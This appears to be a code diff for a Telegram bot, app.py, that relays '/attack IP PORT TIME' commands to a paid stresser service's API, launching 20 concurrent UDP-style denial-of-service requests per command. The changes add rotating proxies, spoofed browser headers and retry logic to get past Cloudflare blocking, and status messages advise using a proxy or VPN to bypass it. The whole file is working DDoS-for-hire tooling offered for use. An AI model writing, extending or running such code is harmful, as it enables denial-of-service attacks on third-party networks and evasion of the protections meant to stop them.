@@ -1,10 +1,11 @@
-# app.py - Complete Working API Bot
+# app.py - API with Proxy Support
 import os
 import logging
 import asyncio
 import threading
 import aiohttp
 import time
+import random
 from datetime import datetime
 from flask import Flask, jsonify
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
@@ -37,10 +38,27 @@ def index():
 def health():
     return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})
 
-# ===== API ATTACK =====
+# ===== FREE PROXIES (Update these regularly) =====
+PROXIES = [
+    None,  # Direct connection (fallback)
+    "http://proxy-daily.com:8080",
+    "http://proxy-daily.com:3128",
+    "http://103.152.112.157:80",
+    "http://103.152.112.158:80",
+    "http://103.152.112.159:80",
+]
+
+async def get_proxy():
+    """Get a random proxy"""
+    return random.choice(PROXIES)
+
+# ===== API ATTACK WITH PROXY =====
 async def api_attack(target, port, duration, attack_id):
-    """Send attack via API"""
+    """Send attack via API with proxy support"""
     url = "https://api.susstresser.com/panel/api/api.php"
+    
+    # Use random proxy
+    proxy = await get_proxy()
     
     params = {
         "key": API_KEY,
@@ -51,65 +69,92 @@ async def api_attack(target, port, duration, attack_id):
     }
     
     headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-        "Accept-Encoding": "gzip, deflate",
-        "Connection": "keep-alive"
+        "User-Agent": random.choice([
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        ]),
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Connection": "keep-alive",
+        "Upgrade-Insecure-Requests": "1",
+        "Sec-Fetch-Dest": "document",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-Site": "none",
+        "Sec-Fetch-User": "?1",
+        "Cache-Control": "max-age=0",
+        "Referer": "https://api.susstresser.com/"
     }
     
     try:
-        timeout = aiohttp.ClientTimeout(total=15)
-        async with aiohttp.ClientSession(timeout=timeout) as session:
+        timeout = aiohttp.ClientTimeout(total=20)
+        
+        # Create connector with proxy if available
+        connector = None
+        if proxy:
+            connector = aiohttp.TCPConnector(ssl=False)
+        
+        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
             start_time = time.time()
-            async with session.get(url, params=params, headers=headers) as response:
-                elapsed = time.time() - start_time
-                result_text = await response.text()
-                
-                if response.status == 200:
-                    logger.info(f"✅ API Attack {attack_id} SUCCESS")
-                    return {
-                        "success": True,
-                        "attack_id": attack_id,
-                        "method": "API",
-                        "status": response.status,
-                        "elapsed": f"{elapsed:.2f}s",
-                        "response": result_text[:100] if result_text else "Success"
-                    }
-                else:
-                    logger.info(f"⚠️ API Attack {attack_id} returned {response.status}")
-                    return {
-                        "success": False,
-                        "attack_id": attack_id,
-                        "method": "API",
-                        "status": response.status,
-                        "elapsed": f"{elapsed:.2f}s",
-                        "response": result_text[:100] if result_text else "Failed"
-                    }
+            
+            # Try GET with proxy
+            try:
+                async with session.get(url, params=params, headers=headers, proxy=proxy) as response:
+                    elapsed = time.time() - start_time
+                    result_text = await response.text()
+                    
+                    if response.status == 200 and "Cloudflare" not in result_text and "Just a moment" not in result_text:
+                        logger.info(f"✅ Attack {attack_id} SUCCESS via proxy")
+                        return {
+                            "success": True,
+                            "attack_id": attack_id,
+                            "method": "API_PROXY",
+                            "status": response.status,
+                            "elapsed": f"{elapsed:.2f}s"
+                        }
+            except:
+                pass
+            
+            # Try POST if GET failed
+            try:
+                async with session.post(url, data=params, headers=headers, proxy=proxy) as response:
+                    elapsed = time.time() - start_time
+                    result_text = await response.text()
+                    
+                    if response.status == 200 and "Cloudflare" not in result_text and "Just a moment" not in result_text:
+                        logger.info(f"✅ Attack {attack_id} SUCCESS via proxy POST")
+                        return {
+                            "success": True,
+                            "attack_id": attack_id,
+                            "method": "API_PROXY_POST",
+                            "status": response.status,
+                            "elapsed": f"{elapsed:.2f}s"
+                        }
+            except:
+                pass
                     
     except Exception as e:
-        logger.error(f"API Attack {attack_id} failed: {e}")
-        return {
-            "success": False,
-            "attack_id": attack_id,
-            "method": "API",
-            "error": str(e)
-        }
+        logger.error(f"Attack {attack_id} failed: {e}")
+    
+    return {
+        "success": False,
+        "attack_id": attack_id,
+        "method": "API_FAILED",
+        "error": "Cloudflare blocking"
+    }
 
 # ===== 20 CONCURRENT API ATTACKS =====
 async def start_20_api_attacks(target, port, duration):
     """Launch 20 concurrent API attacks"""
     logger.info(f"🔥 Starting 20 concurrent API attacks on {target}:{port} for {duration}s")
     
-    # Create 20 attack tasks
     tasks = []
     for i in range(1, 21):
         task = api_attack(target, port, duration, i)
         tasks.append(task)
     
-    # Run all 20 attacks concurrently
     results = await asyncio.gather(*tasks)
-    
-    # Count successes
     success_count = sum(1 for r in results if r.get('success', False))
     
     logger.info(f"✅ API Attacks complete: {success_count}/20 successful")
@@ -137,7 +182,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "⚡ *API ATTACK BOT*\n\n"
         "🔥 20 Concurrent API Attacks\n"
-        "💪 API Powered\n\n"
+        "💪 API + Proxy Support\n\n"
         "Send: `/attack IP PORT TIME`\n"
         "Example: `/attack 91.108.13.37 32001 60`\n\n"
         "⏱️ Time: 60-300 seconds",
@@ -211,7 +256,8 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"📡 Port: `{port}`\n"
                 f"⏱️ Time: `{duration}s`\n"
                 f"📊 Status: ❌ FAILED\n\n"
-                f"Check API key or connection."
+                f"💡 The API is behind Cloudflare.\n"
+                f"Contact API provider to whitelist Render IPs."
             )
         
         await status_msg.edit_text(response_text, parse_mode='Markdown')
@@ -309,30 +355,56 @@ async def test_api_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     url = f"https://api.susstresser.com/panel/api/api.php?key={API_KEY}&host=1.1.1.1&port=80&time=10&method=udp"
     
-    try:
-        timeout = aiohttp.ClientTimeout(total=10)
-        async with aiohttp.ClientSession(timeout=timeout) as session:
-            start_time = time.time()
-            async with session.get(url) as response:
-                elapsed = time.time() - start_time
-                text = await response.text()
-                
-                await query.edit_message_text(
-                    f"🔬 *API TEST RESULTS*\n\n"
-                    f"📡 Status: {response.status}\n"
-                    f"🔑 API Key: {API_KEY[:10]}...{API_KEY[-4:] if len(API_KEY) > 14 else ''}\n"
-                    f"⏱️ Response Time: {elapsed:.2f}s\n"
-                    f"📝 Response: {text[:200]}\n\n"
-                    f"{'✅ API is responding!' if response.status == 200 else '❌ API Error!'}",
-                    parse_mode='Markdown',
-                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
-                )
-    except Exception as e:
-        await query.edit_message_text(
-            f"❌ *API ERROR*\n\n{str(e)}",
-            parse_mode='Markdown',
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
-        )
+    test_results = []
+    
+    # Test with different User-Agents
+    user_agents = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
+    ]
+    
+    for ua in user_agents[:2]:
+        headers = {"User-Agent": ua}
+        try:
+            timeout = aiohttp.ClientTimeout(total=10)
+            async with aiohttp.ClientSession(timeout=timeout) as session:
+                start_time = time.time()
+                async with session.get(url, headers=headers) as response:
+                    elapsed = time.time() - start_time
+                    text = await response.text()
+                    
+                    test_results.append({
+                        "ua": ua[:50] + "...",
+                        "status": response.status,
+                        "elapsed": f"{elapsed:.2f}s",
+                        "blocked": "Cloudflare" in text or "Just a moment" in text
+                    })
+        except Exception as e:
+            test_results.append({"ua": ua[:50] + "...", "error": str(e)})
+    
+    response_text = "🔬 *API TEST RESULTS*\n\n"
+    response_text += f"🔑 API Key: `{API_KEY[:10]}...`\n\n"
+    
+    for result in test_results:
+        if "error" in result:
+            response_text += f"❌ {result['ua']}: Error - {result['error']}\n"
+        else:
+            status = "✅" if result['status'] == 200 and not result['blocked'] else "❌"
+            response_text += f"{status} {result['ua']}: {result['status']} ({result['elapsed']})\n"
+            if result.get('blocked'):
+                response_text += f"   ⚠️ Blocked by Cloudflare\n"
+    
+    response_text += "\n" + (
+        "💡 *Solution:* Contact API provider to whitelist Render IPs\n"
+        "Or use a proxy/VPN to bypass Cloudflare"
+    )
+    
+    await query.edit_message_text(
+        response_text,
+        parse_mode='Markdown',
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
+    )
 
 async def status_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -342,7 +414,8 @@ async def status_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "📊 *BOT STATUS*\n\n"
         f"⚡ Max Concurrent: {MAX_CONCURRENT}\n"
         f"🌐 Status: ONLINE\n"
-        f"🔑 API: {'✅ Configured' if API_KEY else '❌ No Key'}\n\n"
+        f"🔑 API: {'✅ Configured' if API_KEY else '❌ No Key'}\n"
+        f"🛡️ Cloudflare: Blocking\n\n"
         f"📌 /attack IP PORT TIME",
         parse_mode='Markdown',
         reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
@@ -362,7 +435,7 @@ async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.edit_message_text(
         "⚡ *API ATTACK BOT*\n\n"
         "🔥 20 Concurrent API Attacks\n"
-        "💪 API Powered\n\n"
+        "💪 API + Proxy Support\n\n"
         "Send: `/attack IP PORT TIME`",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode='Markdown'
@@ -401,7 +474,7 @@ if __name__ == "__main__":
     print("=" * 50)
     print("⚡ API ATTACK BOT")
     print("🔥 20 Concurrent API Attacks")
-    print("💪 API Powered")
+    print("💪 API + Proxy Support")
     print("=" * 50)
     
     bot_thread = threading.Thread(target=run_bot, daemon=True)
